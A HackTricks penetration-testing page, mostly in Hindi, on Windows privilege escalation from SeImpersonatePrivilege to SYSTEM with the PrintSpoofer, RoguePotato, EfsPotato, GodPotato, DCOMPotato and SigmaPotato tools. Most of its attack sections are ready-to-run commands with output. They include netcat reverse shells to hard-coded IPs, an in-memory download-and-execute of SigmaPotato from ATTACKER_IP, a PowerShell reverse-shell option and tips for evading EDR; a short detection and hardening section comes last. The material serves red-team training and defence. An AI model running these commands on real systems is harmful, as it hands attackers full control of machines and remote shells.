# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** का उपयोग समान विशेषाधिकार प्राप्त करने और `NT AUTHORITY\SYSTEM` स्तर की पहुँच हासिल करने के लिए किया जा सकता है। यह [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) `PrintSpoofer` टूल पर गहराई से चर्चा करता है, जिसका उपयोग Windows 10 और Server 2019 होस्ट्स पर impersonation privileges का दुरुपयोग करने के लिए किया जा सकता है जहाँ JuicyPotato अब काम नहीं करता।

> [!TIP]
> एक आधुनिक विकल्प जो अक्सर 2024–2025 में मेंटेन किया जा रहा है वह SigmaPotato (GodPotato का fork) है जो in-memory/.NET reflection उपयोग और विस्तारित OS समर्थन जोड़ता है। नीचे quick usage और References में repo देखें।

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## आवश्यकताएँ और सामान्य अड़चने

निम्नलिखित सभी तकनीकें उन impersonation-capable privileged सेवाओं का दुरुपयोग करने पर निर्भर करती हैं जिन्हें ऐसे संदर्भ से बुलाया जा सके जहाँ निम्नलिखित में से कोई एक privilege मौजूद हो:

- SeImpersonatePrivilege (सबसे सामान्य) या SeAssignPrimaryTokenPrivilege
- High integrity आवश्यक नहीं है यदि टोकन में पहले से SeImpersonatePrivilege मौजूद हो (आम तौर पर कई service accounts जैसे IIS AppPool, MSSQL, आदि के लिए)

अनुमतियाँ जल्दी जाँचें:
```cmd
whoami /priv | findstr /i impersonate
```
ऑपरेशनल नोट्स:

- यदि आपकी shell restricted token के तहत चलती है जिसमें SeImpersonatePrivilege नहीं है (कुछ संदर्भों में Local Service/Network Service के लिए सामान्य), तो खाते के डिफ़ॉल्ट विशेषाधिकार FullPowers का उपयोग करके पुनः प्राप्त करें, फिर एक Potato चलाएँ। उदाहरण: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer को Print Spooler service की आवश्यकता होती है जो चल रही हो और local RPC endpoint (spoolss) पर पहुँच योग्य हो। जहाँ Spooler को PrintNightmare के बाद बंद कर दिया गया है ऐसे कठोर वातावरण में RoguePotato/GodPotato/DCOMPotato/EfsPotato पसंद करें।
- RoguePotato को TCP/135 पर पहुँच योग्य OXID resolver चाहिए। यदि egress ब्लॉक है, तो redirector/port-forwarder का उपयोग करें (नीचे दिए उदाहरण को देखें)। पुराने बिल्ड्स में -f flag की आवश्यकता होती थी।
- EfsPotato/SharpEfsPotato MS-EFSR का दुरुपयोग करते हैं; यदि एक pipe ब्लॉक है, तो वैकल्पिक pipes आज़माएँ (lsarpc, efsrpc, samr, lsass, netlogon)।
- RpcBindingSetAuthInfo के दौरान Error 0x6d3 आम तौर पर एक अज्ञात/असमर्थित RPC authentication service को दर्शाता है; अलग pipe/transport आज़माएँ या सुनिश्चित करें कि target service चल रही हो।

## त्वरित डेमो

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
नोट्स:
- आप -i का उपयोग वर्तमान कंसोल में एक इंटरैक्टिव प्रक्रिया शुरू करने के लिए कर सकते हैं, या -c का उपयोग एक one-liner चलाने के लिए कर सकते हैं।
- Spooler service की आवश्यकता होती है। यदि यह disabled है, तो यह विफल होगा।

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
यदि आउटबाउंड 135 ब्लॉक है, तो अपने redirector पर socat के माध्यम से OXID resolver को pivot करें:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
टिप: यदि एक pipe विफल हो जाए या EDR इसे ब्लॉक कर दे, तो अन्य समर्थित pipes आज़माएँ:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
नोट्स:
- Windows 8/8.1–11 और Server 2012–2022 पर काम करता है जब SeImpersonatePrivilege मौजूद हो।

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato सेवा DCOM objects को लक्षित करने वाले दो वेरिएंट प्रदान करता है जो डिफ़ॉल्ट रूप से RPC_C_IMP_LEVEL_IMPERSONATE पर होते हैं। प्रदान किए गए binaries को बनाएं या उपयोग करें और अपना कमांड चलाएँ:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (updated GodPotato fork)

SigmaPotato आधुनिक सुविधाएँ जोड़ता है, जैसे in-memory execution via .NET reflection और PowerShell reverse shell helper।
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## डिटेक्शन और हार्डनिंग नोट्स

- Monitor for processes creating named pipes and immediately calling token-duplication APIs followed by CreateProcessAsUser/CreateProcessWithTokenW. Sysmon उपयोगी टेलीमेट्री दिखा सकता है: Event ID 1 (process creation), 17/18 (named pipe created/connected), और command lines जो SYSTEM के रूप में child processes उत्पन्न करते हैं।
- Spooler hardening: उन सर्वरों पर जहाँ इसकी आवश्यकता नहीं है Print Spooler सेवा को disable करना spoolss के माध्यम से PrintSpoofer-style स्थानीय coercions को रोकता है।
- Service account hardening: custom services को SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege देने को न्यूनतम रखें। आवश्यक न्यूनतम privileges वाले virtual accounts के तहत services चलाने पर विचार करें और जहाँ संभव हो उन्हें service SID और write-restricted tokens से isolate करें।
- Network controls: outbound TCP/135 को block करना या RPC endpoint mapper ट्रैफ़िक को restrict करना RoguePotato को बाधित कर सकता है सिवाय इसके कि कोई internal redirector उपलब्ध हो।
- EDR/AV: ये सभी tools व्यापक रूप से signatured हैं। source से recompiling, symbols/strings का नाम बदलना, या in-memory execution का उपयोग detection को कम कर सकता है लेकिन मजबूत behavioral detections को हरा नहीं पाएगा।

## संदर्भ

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)

{{#include ../../banners/hacktricks-training.md}}
